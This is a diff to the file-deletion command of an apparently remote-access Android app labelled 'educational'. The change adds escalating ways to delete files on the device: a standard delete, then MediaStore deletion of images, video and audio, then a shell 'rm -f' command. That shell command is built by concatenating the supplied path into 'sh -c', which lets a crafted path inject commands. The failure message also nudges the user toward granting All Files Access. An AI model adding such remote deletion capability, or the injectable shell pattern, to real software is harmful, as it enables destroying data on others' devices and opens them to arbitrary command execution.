@@ -1,7 +1,12 @@
 package com.remoteaccess.educational.commands;
 
+import android.content.ContentResolver;
 import android.content.Context;
+import android.database.Cursor;
+import android.net.Uri;
+import android.os.Build;
 import android.os.Environment;
+import android.provider.MediaStore;
 import android.util.Base64;
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -184,35 +189,68 @@ public class FileHandler {
     }
 
     /**
-     * Delete file
+     * Delete file — tries standard delete first, then ContentResolver for media,
+     * then shell rm as last resort.
      */
     public JSONObject deleteFile(String filePath) {
         JSONObject result = new JSONObject();
-        
         try {
             File file = new File(filePath);
-            
             if (!file.exists()) {
                 result.put("success", false);
-                result.put("error", "File does not exist");
+                result.put("error", "File does not exist: " + filePath);
                 return result;
             }
 
-            boolean deleted = file.delete();
+            // 1) Standard Java delete
+            boolean deleted = false;
+            try { deleted = file.delete(); } catch (Exception ignored) {}
+
+            // 2) ContentResolver (MediaStore) — works for media files on Android 10+
+            if (!deleted && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                try {
+                    ContentResolver cr = context.getContentResolver();
+                    Uri[] uris = {
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+                        MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                        MediaStore.Files.getContentUri("external")
+                    };
+                    for (Uri baseUri : uris) {
+                        Cursor cursor = cr.query(baseUri,
+                            new String[]{MediaStore.MediaColumns._ID},
+                            MediaStore.MediaColumns.DATA + "=?",
+                            new String[]{filePath}, null);
+                        if (cursor != null && cursor.moveToFirst()) {
+                            long id = cursor.getLong(0);
+                            cursor.close();
+                            Uri itemUri = Uri.withAppendedPath(baseUri, String.valueOf(id));
+                            int rows = cr.delete(itemUri, null, null);
+                            if (rows > 0) { deleted = true; break; }
+                        } else if (cursor != null) { cursor.close(); }
+                    }
+                } catch (Exception ignored) {}
+            }
+
+            // 3) Shell rm (works with root or if shell has permission)
+            if (!deleted) {
+                try {
+                    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", "rm -f \"" + filePath + "\""});
+                    p.waitFor();
+                    deleted = !file.exists();
+                } catch (Exception ignored) {}
+            }
 
             result.put("success", deleted);
             result.put("filePath", filePath);
-            result.put("message", deleted ? "File deleted" : "Failed to delete file");
-            
+            result.put("message", deleted ? "File deleted" : "Could not delete — grant All Files Access in Settings");
         } catch (Exception e) {
             try {
                 result.put("success", false);
+                result.put("filePath", filePath);
                 result.put("error", e.getMessage());
-            } catch (JSONException ex) {
-                ex.printStackTrace();
-            }
+            } catch (JSONException ex) { ex.printStackTrace(); }
         }
-        
         return result;
     }
 
